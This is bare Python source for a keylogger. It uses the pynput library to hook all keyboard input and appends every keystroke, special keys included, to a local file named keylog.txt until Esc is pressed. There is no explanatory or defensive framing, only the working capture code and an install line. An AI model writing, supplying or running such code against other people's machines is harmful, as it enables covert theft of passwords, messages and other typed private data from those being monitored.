'pip install pynput'

from pynput import keyboard

# File to log keystrokes
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like space, enter, etc.)
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"[{key}]")

def on_release(key):
    # Stop listener by pressing 'esc' key
    if key == keyboard.Key.esc:
        return False

def main():
    # Set up the listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
